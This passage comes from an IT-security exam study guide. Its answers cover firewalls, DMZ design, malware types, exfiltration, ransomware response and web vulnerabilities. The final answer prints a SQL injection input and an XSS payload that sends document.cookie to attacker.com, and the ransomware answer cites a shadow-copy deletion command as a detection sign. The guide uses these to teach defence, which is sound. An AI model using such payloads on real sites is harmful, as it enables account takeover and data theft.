    - Return traffic must be permitted by an explicit manual rule, which forces administrators to open wide ranges and weakens security.

    **Stateful firewall**
    - Maintains a **state table** recording every active connection — source, destination, ports, sequence numbers and connection state.
    - When a packet arrives it is checked against this table. If it belongs to an established, approved session, it is allowed without re-evaluating the whole rule set.
    - Only the FIRST packet of a new connection is tested against the rules; the rest are matched by state.

    | Point | Stateless | Stateful |
    |---|---|---|
    | Connection tracking | None | Full state table |
    | Return traffic | Needs a manual rule | Allowed automatically |
    | Speed | Faster, lower memory | Slower, uses memory for the table |
    | Security | Weaker | Much stronger |
    | Detects out-of-state packets | No | Yes — an ACK with no matching SYN is dropped |
    | Protection against spoofing and some DoS | Poor | Good |
    | Rule complexity | High — rules for both directions | Lower — one rule covers the session |
    | Typical use | Router ACLs, very high-throughput filtering | Standard enterprise firewalls |

    Example showing the difference
    - A user browses a website. The stateful firewall sees the outbound request, records the session, and automatically allows the reply.
    - A stateless firewall has no record, so the administrator must permit all inbound traffic on high ports (1024-65535) — a huge and unnecessary exposure.

    - Practically all modern firewalls are stateful. Stateless filtering survives only as router ACLs where raw speed matters more than inspection depth.

20. **What is DMZ? Explain with appropriate figure.** *[NESCO Manager (Software) 2018 compact it 1207 (ET: N/A)]*

Answer: A **DMZ (Demilitarized Zone)** is a separate network segment placed between the untrusted internet and the trusted internal network. It hosts the servers that must be reachable from outside, keeping them isolated from internal systems.

    The name comes from the military idea of a neutral buffer zone between two opposing forces.

    Trust levels
    - **Internet** — untrusted
    - **DMZ** — semi-trusted
    - **Internal LAN** — trusted

    Figure — dual-firewall DMZ (screened subnet)
    ```mermaid
    flowchart LR
        I[INTERNET<br/>Untrusted] --> F1[External Firewall]
        F1 --> D
        subgraph D [DMZ — Semi-trusted]
            W[Web Server]
            M[Mail Server]
            N[DNS Server]
            F[FTP Server]
        end
        D --> F2[Internal Firewall]
        F2 --> L
        subgraph L [INTERNAL LAN — Trusted]
            DB[(Database)]
            FS[File Server]
            PC[Workstations]
        end
    ```

    What goes in the DMZ
    - Web server, mail server, DNS server, FTP server, reverse proxy, VoIP gateway — anything that must accept connections from the internet.

    What NEVER goes in the DMZ
    - Databases, domain controllers, file servers, and any system holding sensitive internal data.

    Purpose and benefit
    - Public servers are the most exposed and therefore the most likely to be compromised.
    - If an attacker takes over the web server, they land in the DMZ — and the internal firewall stands between them and the core network.
    - Without a DMZ, that same compromise would put the attacker directly on the LAN alongside the database.

    Rule principles
    - Internet → DMZ: allow only specific service ports.
    - Internet → LAN: deny completely.
    - DMZ → LAN: deny by default; permit only one narrowly defined path if the application genuinely requires it.
    - LAN → DMZ and LAN → Internet: allowed under policy.

## Malware & Security Threats (20)

1. **Differentiate between a Computer Virus and a Computer Worm based on how they spread and replicate across host networks.** *[Officer (IT) 31 Jul 2026 bscs 02 (ET: N/A)]*

Answer: The essential difference is that a virus needs a HOST FILE and a USER ACTION to spread; a worm is self-contained and self-propagating.

   | Point | Virus | Worm |
   |---|---|---|
   | Host file required | Yes — it attaches to a program or document | No — it is a standalone program |
   | Execution trigger | Runs only when the infected file is opened | Runs by itself |
   | User action needed | Yes — the user must open or run the file | No — spreads automatically |
   | Replication method | Copies itself into other files on the same machine | Copies itself across the network to other machines |
   | Spread mechanism | Infected email attachment, USB drive, shared file | Exploits network and OS vulnerabilities directly |
   | Speed of spread | Slow — depends on humans sharing files | Extremely fast — can cover the internet in hours |
   | Network impact | Limited | Severe — consumes bandwidth heavily |
   | Primary effect | Corrupts or deletes files on the host | Consumes bandwidth and system resources; often installs a backdoor |
   | Examples | Melissa, CIH/Chernobyl, file infectors | Morris Worm, Blaster, Conficker, WannaCry (worm component) |

   How each spreads across a host network
   - **Virus** — it waits. A user must carry the infected file to another machine, or email it, or share it. Its spread rate is limited entirely by human behaviour.
   - **Worm** — it hunts. It scans for reachable hosts, tests them for a known vulnerability such as an unpatched SMB service, exploits it and copies itself across. No human is involved, which is why WannaCry reached 200,000 machines in 150 countries within a day.

   - Practical consequence: patching stops worms, because they depend on a specific vulnerability. User awareness stops viruses, because they depend on a person opening something.

2. **What is exfiltration?** *[National Legal Aid Services Organization Assistant Maintenance Engineer 18.10.2025 compact it 1449 (ET: N/A)]*

Answer: **Data exfiltration** is the unauthorised transfer of data OUT of an organisation's systems to a location controlled by an attacker. It is the "theft" stage of a breach — the point at which a compromise turns into an actual data loss.

   Common exfiltration methods
   - **Over the network** — uploading to an external server, often over HTTPS so it blends with normal traffic.
   - **DNS tunnelling** — encoding stolen data inside DNS queries, which most firewalls allow out unrestricted.
   - **Email** — sending files to a personal or attacker-controlled address.
   - **Cloud storage** — uploading to Dropbox, Google Drive or a personal account.
   - **Removable media** — copying to a USB drive; a classic insider method.
   - **Encrypted or steganographic channels** — hiding data inside images or encrypted tunnels to evade inspection.
   - **Slow drip** — transferring small amounts over weeks to stay below alerting thresholds.

   Detection
   - **DLP (Data Loss Prevention)** systems inspecting outbound content.
   - **Network traffic analysis** — unusual outbound volume, connections to unknown destinations, transfers at odd hours.
   - **UEBA (User and Entity Behaviour Analytics)** — an employee suddenly accessing far more records than normal.
   - **Egress filtering** — blocking unnecessary outbound protocols and ports.

   Prevention
   - Encrypt data at rest so stolen files are useless, enforce least privilege, block or control USB ports, restrict outbound traffic to approved destinations, monitor DNS, and apply strict access logging.

   - Note the modern relevance: ransomware groups now exfiltrate BEFORE encrypting ("double extortion"), so having good backups no longer removes the leverage — the threat becomes publication rather than loss.

3. **Software downloaded from internet and installed that is not malicious is called?** *[BCC Assistant Programmer 11.11.2023 compact it 547 (ET: N/A)]*

Answer: Software downloaded and installed from the internet that is NOT malicious is called **Freeware**, **Shareware** or generally **legitimate software**, depending on its licensing.

   | Term | Meaning |
   |---|---|
   | **Freeware** | Free to use permanently, but the source code is not available. Example: Adobe Reader, Skype |
   | **Shareware** | Free to try for a limited period or with limited features, then payment is required. Example: WinRAR |
   | **Open source software** | Free AND the source code is available to inspect and modify. Example: Linux, Firefox, LibreOffice |
   | **Freemium** | Basic version free, advanced features paid |
   | **Trialware / Demoware** | Full features for a fixed trial period |

   - If the question intends the opposite of malware in general, the term is simply **legitimate** or **benign software**.
   - A related term worth knowing is **PUP (Potentially Unwanted Program)** — software that is not strictly malicious but is bundled unwanted with a download, such as toolbars and adware. It sits between legitimate software and malware.

4. **একটি Virus ও Ransomware এর নাম লিখ?** *[BTCL Junior Assistant Manager 2022 compact it 640 (ET: BUET)]*

Answer:

   **Virus** — **CIH (Chernobyl)** virus, which overwrote the BIOS and hard disk of infected Windows machines in 1998.
   - Other well-known viruses: Melissa, ILOVEYOU, Michelangelo, Stoned, Brain (the first PC virus, 1986).

   **Ransomware** — **WannaCry**, which in May 2017 infected over 200,000 computers in 150 countries within days, encrypting files and demanding Bitcoin payment. It spread using the EternalBlue SMB vulnerability.
   - Other well-known ransomware: Petya, NotPetya, Ryuk, LockBit, CryptoLocker, REvil.

   Brief distinction
   - A **virus** attaches itself to a host file and damages or corrupts data when that file is run.
   - **Ransomware** encrypts the victim's data and demands payment for the decryption key. It does not destroy the data; it holds it hostage.

5. **What is Trojan horse virus?** *[CAAB Assistant Programmer (AP) 2022 compact it 726 (ET: N/A)]*

Answer: A Trojan horse is malware that DISGUISES itself as legitimate, useful software to trick the user into installing it. Once running, it performs malicious actions in the background.

   The name comes from the Greek legend of the wooden horse used to enter Troy — the danger is hidden inside something the victim willingly brings in.

   Key characteristics
   - **Does NOT self-replicate.** Unlike a virus or worm, it cannot spread on its own. This is why calling it a "Trojan horse virus" is technically incorrect — it is a distinct category of malware.
   - **Requires user action** — the victim must download and run it.
   - **Appears useful** — a free game, a cracked application, a fake antivirus, a codec, or an invoice attachment.

   What it does after installation
   - Opens a **backdoor** giving the attacker remote access.
   - Steals passwords, banking credentials and files.
   - Logs keystrokes.
   - Downloads further malware, including ransomware.
   - Enrols the machine in a **botnet**.

   Types
   - Backdoor Trojan, Banking Trojan (Zeus, Emotet), Downloader Trojan, Remote Access Trojan (RAT), Rootkit Trojan, DDoS Trojan, Fake antivirus (scareware).

   Prevention
   - Download software only from official sources, never install cracked or pirated applications, keep antivirus updated, do not open unexpected attachments, and enable a firewall to catch outbound backdoor connections.

6. **Computer এর Virus কি?** *[BPSC Computer Operator 2021 compact it 780 (ET: N/A)]*

Answer: A computer virus is a malicious program that attaches itself to a legitimate file or program and replicates by inserting copies of itself into other files, damaging data or disrupting the system as it spreads.

   - **VIRUS** stands for **Vital Information Resources Under Seize**.
   - It cannot run on its own. The infected host file must be executed before the virus becomes active.

   How it spreads
   - Infected email attachments, USB drives, downloaded files, pirated software, and shared network folders.

   Types of virus
   - **Boot sector virus** — infects the boot sector of a disk.
   - **File infector** — attaches to executable files (`.exe`, `.com`).
   - **Macro virus** — hides in Word or Excel macros.
   - **Polymorphic virus** — changes its own code to evade signature detection.
   - **Resident virus** — installs itself in memory and infects files as they are opened.
   - **Multipartite virus** — infects both boot sector and files.

   Symptoms of infection
   - Slow performance, frequent crashes, unexpected pop-ups, files disappearing or changing size, programs starting on their own, and unusually high disk or network activity.

   Prevention
   - Install and update antivirus software, keep the operating system patched, avoid pirated software, scan USB drives before use, do not open unknown attachments, and keep regular backups.

7. **Trojan Horse কি?** *[BPSC Computer Operator 2021 compact it 781 (ET: N/A)]*

Answer: A Trojan horse is malware that pretends to be legitimate software so the user installs it voluntarily, and then performs harmful actions secretly in the background.

   Main characteristics
   - **Disguised** as a useful program — a game, utility, cracked software or an attachment that looks like an invoice.
   - **Does NOT self-replicate** — unlike a virus or worm, it cannot spread by itself. It relies entirely on tricking a person.
   - **Runs hidden** — the user often sees the promised functionality while the malicious payload runs unseen.

   What it does
   - Creates a backdoor for remote control, steals passwords and banking credentials, logs keystrokes, downloads additional malware, or joins the machine to a botnet.

   Example
   - A user downloads what appears to be a free PDF converter. It does convert PDFs — but it also installs a remote access tool that gives the attacker full control of the machine.

   Prevention
   - Use only official download sources, avoid cracked and pirated software, keep antivirus updated, do not open unexpected attachments, and use a firewall to detect the outbound connection a Trojan makes to its controller.

8. **What is QR code? What is Rootkit and bootkit?** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 820-821 (ET: BUET)]*

Answer:

   **(a) QR code**
   - **QR = Quick Response code**, a two-dimensional matrix barcode invented by Denso Wave in Japan in 1994.
   - It stores data in both directions (horizontal and vertical), so it holds far more than a linear barcode — up to about 7,000 digits or 4,300 alphanumeric characters.
   - It contains error correction, so it still scans correctly even when up to 30% of the code is damaged or obscured.
   - Uses: payment (Bangla QR, bKash), website links, Wi-Fi credentials, product tracking, tickets, contact cards.
   - **Security risk — "quishing"**: a malicious QR code can lead to a phishing site or trigger a download. Since the destination is invisible to the eye, the user cannot check it before scanning.

   **(b) Rootkit**
   - Malware designed to gain and MAINTAIN privileged (root/administrator) access while HIDING its own presence from the user and from security software.
   - It achieves concealment by intercepting and altering system calls, so files, processes and network connections belonging to the attacker simply do not appear in normal listings.
   - Types by level: user-mode, kernel-mode, hypervisor, firmware and bootkit.
   - Very difficult to detect and often impossible to remove reliably — the safe response is to wipe and reinstall the operating system.

   **(c) Bootkit**
   - A specialised rootkit that infects the **boot process itself** — the MBR, VBR or UEFI firmware — so it loads BEFORE the operating system and before any antivirus.
   - Because it is already in control when the OS starts, it can hide from every security tool running inside that OS.
   - It survives reinstalling the operating system, and firmware bootkits survive replacing the hard disk.
   - Examples: TDL4/Alureon, Rovnix, LoJax (a UEFI bootkit).
   - Defence: **UEFI Secure Boot**, which verifies the digital signature of the bootloader; TPM-based measured boot; and keeping firmware updated.

   - Relationship: a bootkit is a rootkit that has moved lower in the stack. The lower the malware sits, the harder it is to detect — which is why boot-level integrity verification matters.

9. **Suppose your computer system is attack by a VIRUS and it's also copy into the six neighbor computer. Then it encrypts your all data in your all data in your system so that you can’t detect your data. What is the name of the VIRUS, how can you detect it?** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 821 (ET: BUET)]*

Answer: The described behaviour — self-copying to neighbouring computers on the network AND encrypting all data — identifies it as a **ransomware worm**, most characteristically **WannaCry** (also called WannaCrypt).

   Why the classification fits
   - **Self-propagation to six neighbouring computers** without user action is worm behaviour, not virus behaviour. WannaCry used the EternalBlue exploit against the SMBv1 protocol to spread automatically across the LAN.
   - **Encrypting all data so it cannot be read** is ransomware behaviour.
   - The combination — a self-spreading encryptor — is exactly the WannaCry pattern of May 2017, which reached 200,000 machines in 150 countries within days.
   - Other examples of the same class: NotPetya, Bad Rabbit.

   How to detect it
   - **Ransom note** — a text file or changed desktop wallpaper demanding payment appears in every folder.
   - **File extensions changed** — files renamed to `.wncry`, `.locked`, `.encrypted` or similar, and no longer opening.
   - **Sudden very high disk activity** as thousands of files are read, encrypted and rewritten.
   - **Shadow copies deleted** — `vssadmin delete shadows` is a signature action, visible in Windows event logs.
   - **Unusual internal network traffic**, especially SMB scanning on port 445 to neighbouring hosts.
   - **Antivirus / EDR alerts** on known signatures and on mass-file-modification behaviour.
   - **Outbound connections** to command-and-control servers or Tor.
   - **Users reporting** they cannot open files — often the first real signal.

   Immediate response
   - **Disconnect infected machines from the network at once** to stop lateral spread — this is the single most important action.
   - Do not power off if forensic evidence in memory is needed; isolate instead.
   - Identify the strain, restore from clean OFFLINE backups, patch the exploited vulnerability (MS17-010 for WannaCry), reset credentials, and report to the authorities.
   - **Do not pay.** Payment funds further attacks and does not reliably return the data.

   Prevention
   - Prompt patching, disabling SMBv1, network segmentation, offline and immutable backups with tested restores, least privilege, and email filtering.

10. **‘Trojan Horse’ এর একটি বৈশিষ্ট্য লিখুন।** *[DMLC Assistant Teacher (ICT) 2021 compact it 825 (ET: N/A)]*

Answer: The defining characteristic of a Trojan horse is that **it disguises itself as legitimate, useful software to deceive the user into installing it voluntarily** — and it does NOT self-replicate.

    Expanding on that single characteristic
    - Unlike a virus, it does not attach to other files. Unlike a worm, it does not spread across the network by itself.
    - It depends entirely on **social engineering** — the user must be persuaded to download and run it.
    - It usually delivers the promised functionality as well, which is what keeps the victim from becoming suspicious.
    - Its real payload runs hidden: opening a backdoor, stealing credentials, logging keystrokes, or downloading further malware.

    - This is why user awareness, not just technical controls, is the primary defence against Trojans. A firewall or antivirus can help, but the attack succeeds at the moment a person chooses to run the file.

11. **Explain: Worm, Botnet, Ransomware and Trojan horse.** *[SPCBL Assistant Maintenance Engineer 20.11.2021 compact it 874 (ET: N/A)]*

Answer:

    **(a) Worm**
    - A standalone malicious program that replicates itself and spreads across a network WITHOUT needing a host file or any user action.
    - It finds reachable machines, exploits a vulnerability (typically an unpatched network service) and copies itself across.
    - Effects: consumes bandwidth and system resources, often installs a backdoor or other payload.
    - Examples: Morris Worm (1988), Blaster, Conficker, WannaCry's propagation component.
    - Defence: prompt patching — worms depend on a specific known vulnerability.

    **(b) Botnet**
    - A network of compromised computers (called bots or zombies) under the remote control of an attacker through a command-and-control server.
    - The owners are usually unaware their machines are part of it.
    - Uses: launching DDoS attacks, sending spam, mining cryptocurrency, credential stuffing, and distributing further malware.
    - Modern botnets increasingly recruit poorly secured IoT devices — the Mirai botnet used cameras and routers with default passwords.
    - Defence: patching, changing default credentials, egress filtering, and monitoring for outbound C2 traffic.

    **(c) Ransomware**
    - Malware that encrypts the victim's files and demands payment, usually in cryptocurrency, for the decryption key.
    - Spread: phishing attachments, unpatched vulnerabilities, compromised RDP with weak passwords.
    - **Double extortion** is now standard — data is stolen before encryption, so the attacker can threaten publication even if backups exist.
    - Examples: WannaCry, Ryuk, LockBit, CryptoLocker.
    - Defence: offline and immutable backups with tested restores, patching, EDR, network segmentation, least privilege.

    **(d) Trojan horse**
    - Malware disguised as legitimate software, which the user installs voluntarily.
    - Does not self-replicate; relies entirely on deception.
    - Payload: backdoor access, credential theft, keylogging, downloading more malware.
    - Examples: Zeus and Emotet (banking Trojans), various Remote Access Trojans.
    - Defence: official download sources only, no pirated software, updated antivirus, and user awareness.

12. **Malware বলতে কী বুঝানো হয়? উদাহরণসহ সংক্ষেপে বর্ণনা করুন।** *[41th BCS 2021 compact it 883 (ET: N/A)]*

Answer: **Malware** (malicious software) is any program or code deliberately written to damage, disrupt or gain unauthorised access to a computer system, network or data.

    Types with examples

    | Type | Description | Example |
    |---|---|---|
    | **Virus** | Attaches to a host file, replicates when that file runs | CIH, Melissa |
    | **Worm** | Standalone, spreads across networks by itself | Conficker, Blaster |
    | **Trojan horse** | Disguised as legitimate software; does not self-replicate | Zeus, Emotet |
    | **Ransomware** | Encrypts data and demands payment | WannaCry, LockBit |
    | **Spyware** | Secretly monitors activity and steals information | Keyloggers, Pegasus |
    | **Adware** | Displays unwanted advertisements, often bundled with free software | Various browser toolbars |
    | **Rootkit** | Hides itself and maintains privileged access | TDL4, LoJax |
    | **Botnet malware** | Turns the machine into a remotely controlled bot | Mirai |
    | **Keylogger** | Records every keystroke including passwords | — |
    | **Fileless malware** | Runs in memory only, leaving no file to scan | PowerShell-based attacks |

    How malware spreads
    - Phishing email attachments, malicious links and downloads, pirated and cracked software, infected USB drives, drive-by downloads from compromised websites, and exploitation of unpatched vulnerabilities.

    Protection
    - Updated antivirus and EDR, prompt patching, firewall, email filtering, avoiding pirated software, scanning removable media, least privilege, regular offline backups, and user awareness training.

13. **Define component of computer virus.** *[BREB Assistant General Manager (IT) 2021 compact it 934 (ET: N/A)]*

Answer: A computer virus is built from three functional components.

    **(a) Infection mechanism (infection vector)**
    - The part that finds new targets and inserts a copy of the virus into them.
    - It searches for suitable host files — executables, documents with macros, or the boot sector — and attaches the viral code, usually modifying the entry point so the virus runs first.
    - This is the only component every virus MUST have; it is what makes it a virus rather than any other malware.

    **(b) Trigger (logic bomb)**
    - The condition that decides WHEN the payload activates.
    - It may be a date (the Michelangelo virus activated on 6 March), a number of executions, the presence of a particular file, or a user action.
    - Until the trigger fires, the virus only spreads quietly, which maximises how far it travels before being noticed.

    **(c) Payload**
    - The actual damaging action: deleting or corrupting files, encrypting data, stealing information, displaying messages, opening a backdoor, or degrading performance.
    - The payload is OPTIONAL — some viruses only replicate and cause harm merely through resource consumption.

    Typical life cycle
    ```
    Dormant phase → Propagation phase → Triggering phase → Execution phase
    ```
    - Dormant: idle, waiting. Propagation: copying itself into other files. Triggering: the activation condition is met. Execution: the payload runs.

    - Some viruses add a fourth component, a **concealment mechanism** — encryption, polymorphism or stealth techniques — to evade antivirus detection.

14. **দুটি এন্টিভাইরাস সফটওয়্যার এর নাম লিখ।** *[BPSC Ministry of Women and Children Affairs Computer Trainer 2021 compact it 945 (ET: N/A)]*

Answer: Two antivirus software:

    - **Kaspersky Anti-Virus**
    - **Norton Antivirus** (Symantec)

    Other well-known antivirus software
    - **Windows Defender** (built into Windows, free), **Avast**, **AVG**, **Bitdefender**, **McAfee**, **ESET NOD32**, **Malwarebytes**, **Trend Micro**, **Sophos**.

    How antivirus works
    - **Signature-based detection** — compares files against a database of known malware fingerprints. Requires frequent updates.
    - **Heuristic analysis** — looks for suspicious code patterns, catching variants of known malware.
    - **Behavioural monitoring** — watches what a program actually does at run time, which can catch unknown malware.
    - **Sandboxing** — runs a suspicious file in isolation to observe it safely.
    - **Real-time protection** — scans files as they are opened, downloaded or executed.

    - Modern enterprise products are called **EDR (Endpoint Detection and Response)**, which add continuous monitoring, threat hunting and automated response beyond traditional antivirus.

15. **কম্পিউটার ভাইরাস, ওয়ার্ম এবং ট্রোজান হর্স এর মধ্যে পার্থক্য লিখ।** *[PGCL Sub Assistant Engineer (CSE) 2021 compact it 947 (ET: BUET)]*

Answer:

    | Point | Virus | Worm | Trojan Horse |
    |---|---|---|---|
    | Self-replication | Yes, into other files | Yes, across the network | **No** |
    | Host file needed | Yes | No — standalone | No — it IS the program |
    | User action needed | Yes, must run the infected file | No, spreads automatically | Yes, user must install it |
    | Spread speed | Slow | Very fast | Depends on how many people are tricked |
    | Spread method | Infected files, USB, email attachment | Exploits network/OS vulnerabilities | Social engineering — disguised as useful software |
    | Main damage | Corrupts or deletes files | Consumes bandwidth and resources; installs payload | Backdoor, credential theft, spying |
    | Detection | Antivirus signature | Unusual network traffic | Behaviour monitoring |
    | Examples | CIH, Melissa | Conficker, Blaster, Morris | Zeus, Emotet, fake antivirus |

    The single distinguishing question for each
    - **Virus** — does it attach to another file and need that file to be run? Yes.
    - **Worm** — does it copy itself to other machines with no human involved? Yes.
    - **Trojan** — does it pretend to be something useful, and does it fail to spread on its own? Yes.

    Practical consequence for defence
    - Against **viruses**: antivirus and user caution with files.
    - Against **worms**: patching, because they exploit specific known vulnerabilities.
    - Against **Trojans**: user awareness and controlling what software may be installed.

16. **Write down possible threats to a computer systems and how to provide security?** *[BTRC Assistant Director (Technical) 2019 compact it 1146 (ET: N/A)]*

Answer:

    (a) Possible threats

    **Malware threats**
    - Virus, worm, Trojan horse, ransomware, spyware, adware, rootkit, keylogger, botnet.

    **Network threats**
    - DoS and DDoS, Man-in-the-Middle, packet sniffing, ARP and DNS spoofing, session hijacking, unauthorised access.

    **Application and web threats**
    - SQL injection, cross-site scripting, CSRF, buffer overflow, zero-day exploits.

    **Human threats**
    - Phishing and social engineering, insider misuse, weak or shared passwords, careless handling of data.

    **Physical threats**
    - Theft of equipment, unauthorised physical access, fire, flood, power failure, hardware failure.

    **Data threats**
    - Data breach, data loss, unauthorised modification, accidental deletion.

    (b) How to provide security

    **Technical controls**
    - **Firewall and IPS** at the network boundary and between segments.
    - **Antivirus / EDR** on every endpoint, kept updated.
    - **Patch management** — apply OS and application security updates promptly; unpatched systems are the most common entry point.
    - **Encryption** of data at rest and in transit.
    - **Multi-factor authentication** and strong password policy.
    - **Access control** on the principle of least privilege, with regular access review.
    - **Network segmentation** so a breach in one zone cannot spread.
    - **Email and web filtering**.
    - **Regular backups**, following the 3-2-1 rule with tested restores and at least one offline copy.

    **Physical controls**
    - Locked server rooms, biometric access, CCTV, UPS and generator, fire suppression, environmental monitoring.

    **Administrative controls**
    - Written security policy, user awareness training, incident response plan, regular VAPT and audit, vendor security assessment, and a documented disaster recovery plan.

    - Guiding principle: **defence in depth**. No single control is sufficient, so layers are combined so that the failure of one does not expose the whole system.

17. **What protection do you provide for your computer from malware?** *[Bangladesh Bank Assistant Programmer 2019 compact it 1155 (ET: DU)]*

Answer: Malware protection works best as several layers, not one product.

    (a) Software protection
    - **Install antivirus / anti-malware** and keep its definitions updated automatically. Enable real-time scanning.
    - **Enable the firewall** — the built-in Windows or Linux firewall catches outbound connections a Trojan makes to its controller.
    - **Keep everything patched** — the operating system, browser, Java, PDF reader and Office. Most infections exploit a vulnerability for which a patch already existed.
    - **Use a modern browser** with safe-browsing enabled and an ad/script blocker.

    (b) Safe usage habits
    - **Do not open unexpected email attachments or links**, even from a known sender — their account may be compromised.
    - **Download software only from official sources.** Never use cracked or pirated software; it is one of the most common malware carriers.
    - **Scan USB drives** before opening them, and disable autorun.
    - **Verify before enabling macros** in Office documents.
    - **Check the URL** before entering credentials.

    (c) System configuration
    - **Run as a standard user, not administrator**, for daily work. Malware then cannot install system-wide.
    - **Enable UAC** so privilege elevation requires explicit approval.
    - **Disable unnecessary services and ports**.
    - **Use strong unique passwords with a password manager**, and enable multi-factor authentication.
    - **Encrypt the disk** so data is protected if the machine is stolen.

    (d) Backup and recovery
    - Keep **regular backups**, with at least one copy offline or immutable. This is the only reliable defence against ransomware.
    - **Test restores** periodically — an untested backup is only an assumption.

    (e) Monitoring
    - Watch for symptoms: sudden slowness, unexpected pop-ups, unknown programs starting, high disk or network activity, and disabled antivirus.

    - The most effective single measure remains **prompt patching combined with not running unknown software** — technology cannot fully compensate for a user who chooses to run a malicious file.

18. **Describe five types of malware threats and mention five known countermeasures.** *[Combined 3 Banks Assistant Programmer 2018 compact it 1197-1198 (ET: N/A)]*

Answer:

    (a) Five types of malware threat

    **1. Virus**
    - Attaches itself to a legitimate file and replicates when that file is executed. Corrupts or deletes data.
    - Requires user action and a host file. Example: CIH, Melissa.

    **2. Worm**
    - A standalone program that copies itself across networks automatically by exploiting vulnerabilities, with no user involvement.
    - Consumes bandwidth heavily and spreads extremely fast. Example: Conficker, Blaster.

    **3. Trojan horse**
    - Disguised as legitimate software so the user installs it voluntarily. Does not self-replicate.
    - Opens backdoors, steals credentials, logs keystrokes. Example: Zeus, Emotet.

    **4. Ransomware**
    - Encrypts the victim's data and demands payment for the key. Modern variants also steal the data first and threaten to publish it.
    - Example: WannaCry, LockBit.

    **5. Spyware / Keylogger**
    - Secretly monitors the user, recording keystrokes, screenshots, browsing history and credentials, and sends them to the attacker.
    - Often bundled with free software. Example: various banking keyloggers, Pegasus.

    (b) Five known countermeasures

    **1. Antivirus and EDR with real-time protection**
    - Signature, heuristic and behavioural detection on every endpoint, with automatic definition updates.

    **2. Patch management**
    - Prompt application of OS and software security updates. Worms and most exploits depend on a known unpatched vulnerability.

    **3. Firewall and network segmentation**
    - Blocks unauthorised inbound access and outbound command-and-control traffic; segmentation limits how far malware can spread after a breach.

    **4. Regular offline backups with tested restores**
    - The 3-2-1 rule: three copies, two media types, one off-site. This is the only reliable recovery from ransomware.

    **5. User awareness training and least privilege**
    - Most malware arrives through a person opening something. Training plus running users as non-administrators prevents both the initial click and the system-wide installation that would follow.

    - Additional controls: email and web filtering, application whitelisting, multi-factor authentication, disabling macros by default, and removable media control.

19. **Define ransomware attack.** *[NESCO Manager (Software) 2018 compact it 1209 (ET: N/A)]*

Answer: A ransomware attack is a cyber attack in which malware encrypts the victim's files or locks the entire system, making the data inaccessible, and the attacker then demands a ransom — usually in cryptocurrency — in exchange for the decryption key.

    How the attack proceeds
    - **Infection** — arrives through a phishing attachment, a malicious link, an unpatched vulnerability, or a compromised RDP session with a weak password.
    - **Establish and spread** — gains persistence and moves laterally across the network to maximise damage.
    - **Exfiltrate** — modern ransomware steals the data BEFORE encrypting it.
    - **Encrypt** — files are encrypted with strong cryptography, and shadow copies and backups are deleted.
    - **Extort** — a ransom note appears demanding payment, usually with a deadline.

    Types
    - **Crypto ransomware** — encrypts files (the common form).
    - **Locker ransomware** — locks the whole screen or device without encrypting files.
    - **Double extortion** — encrypt AND threaten to publish the stolen data, so backups alone do not remove the leverage.
    - **RaaS (Ransomware as a Service)** — kits sold to less skilled criminals, which is why attack volume has grown so fast.

    Impact
    - Operational shutdown, financial loss, data breach, regulatory penalties and reputational damage.

    Prevention and response
    - **Prevention**: offline and immutable backups with tested restores, prompt patching, email filtering, EDR, network segmentation, least privilege, MFA, and disabling unnecessary RDP.
    - **Response**: isolate infected machines immediately, do not pay, identify the strain, restore from clean backups, patch the entry point, reset credentials and report to the authorities.

20. **c) What is a computer virus? Name of the two software that are used to prevent the virus.** *[Ministry of Finance Programmer 2013 compact it 1272 (ET: N/A)]*

Answer:

    (a) Computer virus
    - A malicious program that attaches itself to a legitimate file or program and replicates by copying itself into other files, damaging data or disrupting the system.
    - It cannot execute on its own — the infected host file must be run first.
    - **VIRUS** stands for Vital Information Resources Under Seize.
    - Types: boot sector virus, file infector, macro virus, polymorphic virus, resident virus, multipartite virus.
    - Symptoms: slow performance, frequent crashes, unexpected pop-ups, files changing size or disappearing, and unusually high disk activity.

    (b) Two software used to prevent viruses
    - **Kaspersky Anti-Virus**
    - **Norton Antivirus** (Symantec)

    Other antivirus software
    - Windows Defender (built into Windows), Avast, AVG, Bitdefender, McAfee, ESET NOD32, Malwarebytes, Trend Micro, Sophos.

    How antivirus prevents infection
    - **Real-time scanning** of files as they are opened, downloaded or executed.
    - **Signature detection** against a database of known malware, updated frequently.
    - **Heuristic and behavioural analysis** to catch new and modified variants.
    - **Quarantine and removal** of infected files.
    - **Web and email protection**, blocking malicious sites and attachments before they reach the user.

## Web Security Vulnerabilities (19)

1. **Describe the SQL Injection and Cross-Site Scripting (XSS) web security threats and suggest preventive measures for each.** *[Officer (IT) 31 Jul 2026 bscs 02 (ET: N/A)]*

Answer:

   **(a) SQL Injection**
   - A vulnerability where an attacker inserts malicious SQL into a user input field, so the database executes commands the developer never intended. It happens whenever user input is concatenated directly into a query string.

   Example
   ```php
   // Vulnerable code
   $query = "SELECT * FROM users WHERE user_id = '$id'";

   // Attacker enters:  1' OR '1'='1
   // Query becomes:
   SELECT * FROM users WHERE user_id = '1' OR '1'='1'
   ```
   - The condition is always true, so every user record is returned instead of one.

   Impact: authentication bypass, reading the whole database, modifying or deleting records, and in some configurations executing OS commands.

   Prevention
   - **Parameterised queries / prepared statements** — the single most effective fix. Input is treated strictly as DATA, never as code.
   - **Stored procedures** with parameters.
   - **Whitelist input validation** — accept only the expected format.
   - **ORM frameworks** (Hibernate, Entity Framework) that generate safe queries.
   - **Least-privilege database account** — the web application must never connect as `root` or `sa`.
   - **Generic error messages**, so the database structure is not revealed.
   - **Web Application Firewall** as an additional layer.

   **(b) Cross-Site Scripting (XSS)**
   - A vulnerability where an attacker injects malicious script into a web page, which then executes in ANOTHER user's browser with that user's privileges.

   Example
   ```html
   <!-- Attacker submits this as a comment -->
   <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
   ```
   - Every visitor who loads the page sends their session cookie to the attacker.

   Types: **Stored** (script saved in the database and served to every visitor), **Reflected** (script comes back in the response to a crafted link), **DOM-based** (client-side JavaScript writes unsafe data into the DOM).

   Impact: session cookie theft and account takeover, defacement, keylogging, phishing, and redirecting users to malicious sites.

   Prevention
   - **Output encoding** — HTML-encode all untrusted data before rendering. `<` becomes `&lt;`, so the browser displays it instead of executing it.
   - **Input validation and sanitisation** using a proven library such as DOMPurify.
   - **Content Security Policy (CSP)** — restricts which scripts the browser may execute.
   - **HttpOnly cookies** — JavaScript cannot read them, so stolen scripts cannot steal the session.
   - Avoid `innerHTML` and `eval()`; use `textContent` instead.

   - Key distinction: SQL injection targets the SERVER's database; XSS targets ANOTHER USER's browser.

